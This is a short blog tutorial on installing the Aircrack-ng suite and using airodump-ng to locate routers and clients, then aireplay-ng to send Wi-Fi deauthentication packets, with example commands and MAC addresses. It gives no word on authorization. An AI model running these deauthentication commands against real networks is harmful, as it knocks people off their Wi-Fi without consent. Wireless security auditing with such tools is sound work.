---
layout: post
title: Installing and Using Aircrack-ng
excerpt: A quick guide to installation and basic usage of the Aircrack-ng suite.
---
###Installation
Use the following code

	sudo apt-get install libssl-dev iw
	wget http://download.aircrack-ng.org/aircrack-ng-1.2-beta1.tar.gz
	tar -xvzf aircrack-ng-1.2-beta1.tar.gz
	cd aircrack-ng-1.2-beta1/
	sudo make && sudo make install
	sudo airodump-ng-oui-update

###Usage

####Using Airodump-ng for Locating Routers and Clients
1. Set Wifi Adaptor into Monitor Mode

		sudo iw phy phy0 interface add mon0 type monitor 
		sudo iw dev wlan1 del

2. Start Airodump

		sudo airodump-ng mon0

3. Choosing Target

	Note the BSSID of the Router and Client along with the Channel

	Example:

		BSSID (Client): 00:13:49:A8:77:4F 
		BSSID (Router): A3:13:2F:43:6A:42
		Channel: 3

More Info:
[Airodump-ng](http://www.aircrack-ng.org/doku.php?id=airodump-ng)
	
####Using Aireplay-ng for Basic Deauthentication
1. Set Wifi Adaptor into Monitor Mode

		sudo iw phy phy0 interface add mon0 type monitor 
		sudo iw dev wlan1 del
2. Configure Wifi Adaptor to Specified Channel

		sudo iwconfig mon0 channel 1
		
3. Sending Deauth Packets

		sudo aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:AE:CE:9D mon0
		
	`1` refers to number of Deauth Packets sent. `0` sends an infinite amount.
	
	`-a 00:14:6C:7E:40:80` is the MAC address of the access point.
	
	`-c 000:0F:B5:AE:CE:9D` is the MAC address of the client. Not necessary if deauthing all connected clients.
4. Setting Wifi adaptor back to managed mode

		sudo iw phy phy0 interface add wlan0 type managed
		sudo iw dev mon0 del
	
More Info:
[Aireplay-ng](http://www.aircrack-ng.org/doku.php?id=aireplay-ng)

Alternative:
[Airdrop-ng](http://www.aircrack-ng.org/doku.php?id=airdrop-ng) can also be used to send deauth packets with categorical rules allowing for more automation and usability.	

Additional Resources:
[Aircrack-ng website](http://www.aircrack-ng.org/doku.php?id=Main)